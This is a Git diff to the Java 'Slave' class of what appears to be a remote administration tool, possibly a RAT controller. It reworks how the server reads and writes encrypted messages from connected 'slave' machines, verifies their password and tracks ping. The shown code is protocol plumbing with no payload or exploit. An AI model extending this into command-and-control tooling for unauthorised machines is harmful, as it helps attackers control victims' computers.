@@ -19,7 +19,6 @@ import com.redpois0n.common.Version;
 import com.redpois0n.common.codec.Hex;
 import com.redpois0n.common.crypto.Crypto;
 import com.redpois0n.exceptions.CloseException;
-import com.redpois0n.io.CustomStream;
 import com.redpois0n.ip2c.Country;
 import com.redpois0n.net.ConnectionHandler;
 import com.redpois0n.net.PortListener;
@@ -35,7 +34,7 @@ import com.redpois0n.utils.TrayIconUtils;
 import com.redpois0n.utils.Util;
 
 @SuppressWarnings("unused")
-public class Slave extends CustomStream implements Runnable {
+public class Slave implements Runnable {
 
 	public static boolean encryption = true;
 
@@ -135,28 +134,28 @@ public class Slave extends CustomStream implements Runnable {
 			this.outputStream.write(encryption ? 1 : 0);
 
 			while (true) {
-				short line = (short) readInt();
+				byte header = readByte();
 
-				if (line == 1 && connection.getPass().equals(readLine())) {
+				if (header == 1 && connection.getPass().equals(readLine())) {
 					setVerified(true);
 					ConnectionHandler.addSlave(this);
 					continue;
 				}
 
 				if (!isVerified()) {
-					String pass = readLine();
-					PanelMainLog.instance.addEntry("Warning", this, "Failed verify password: " + pass);
-					this.closeSocket(new CloseException("Failed verify password: " + pass));
+					//String pass = readLine();
+					PanelMainLog.instance.addEntry("Warning", this, "Failed verify password");
+					this.closeSocket(new CloseException("Failed verify password"));
 				}
 
-				if (line == 0) {
+				if (header == 0) {
 					long ping = System.currentTimeMillis() - pingms;
 					this.ping = (int) ping;
 					Frame.mainModel.setValueAt(ping + " ms", Util.getRow(3, getIP()), 4);
 					continue;
 				}
 
-				Packets.execute(line, this);
+				Packets.execute(header, this);
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
@@ -174,6 +173,94 @@ public class Slave extends CustomStream implements Runnable {
 		PacketBuilder builder = new PacketBuilder(header);
 		addToSendQueue(builder);
 	}
+	
+	public  void writeShort(int i) throws Exception {
+		if (true) {
+			writeLine(i);
+		} else {
+			dos.writeShort(i);
+
+		}
+	}
+
+	public  short readShort() throws Exception {
+		if (true) {
+			return Short.parseShort(readLine());
+		} else {
+			return dis.readShort();
+
+		}
+	}
+
+	public  byte readByte() throws Exception {
+		if (true) {
+			return Byte.parseByte(readLine());
+		} else {
+			return dis.readByte();
+
+		}
+	}
+
+	public  void writeByte(int b) throws Exception {
+		if (true) {
+			writeLine(b);
+		} else {
+			dos.writeByte(b);
+
+		}
+	}
+
+	public  boolean readBoolean() throws Exception {
+		if (true) {
+			return readLine().equalsIgnoreCase("true");
+		} else {
+			return dis.readBoolean();
+
+		}
+	}
+
+	public  void writeBoolean(boolean b) throws Exception {
+		if (true) {
+			writeLine(b);
+		} else {
+			dos.writeBoolean(b);
+
+		}
+	}
+
+	public  int readInt() throws Exception {
+		if (true) {
+			return Integer.parseInt(readLine());
+		} else {
+			return dis.readInt();
+
+		}
+	}
+
+	public  void writeInt(int i) throws Exception {
+		if (true) {
+			writeLine(i);
+		} else {
+			dos.writeInt(i);
+
+		}
+	}
+
+	public  long readLong() throws Exception {
+		if (true) {
+			return Long.parseLong(readLine());
+		} else {
+			return dis.readLong();
+		}
+	}
+
+	public  void writeLong(long l) throws Exception {
+		if (true) {
+			writeLine(l);
+		} else {
+			dos.writeLong(l);
+		}
+	}
 
 	public synchronized void addToSendQueue(PacketBuilder packet) {
 		while (lock) {
@@ -187,7 +274,11 @@ public class Slave extends CustomStream implements Runnable {
 		packet.write(this);
 	}
 
-	@Override
+	
+	public void writeLine(Object obj) {
+		writeLine(obj.toString());
+	}
+	
 	public void writeLine(String s) {
 		try {
 			String enc = Crypto.encrypt(s, connection.getKey().getKey());
@@ -200,25 +291,24 @@ public class Slave extends CustomStream implements Runnable {
 				enc = "-c " + s;
 			}
 
-			dos.writeUTF(enc);
-			//dos.writeShort(enc.length());
-			//dos.writeChars(enc);
+			//dos.writeUTF(enc);
+			dos.writeShort(enc.length());
+			dos.writeChars(enc);
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
 	}
 
-	@Override
 	public String readLine() throws Exception {
-		String s = dis.readUTF();
-		/*short len = dis.readShort();
+		//String s = dis.readUTF();
+		short len = dis.readShort();
 
 		StringBuilder builder = new StringBuilder();
 		for (int i = 0; i < len; i++) {
 			builder.append(dis.readChar());
 		}
 
-		String s = builder.toString();*/
+		String s = builder.toString();
 
 		if (s.startsWith("-h ")) {
 			s = Hex.decode(s.substring(3, s.length()));
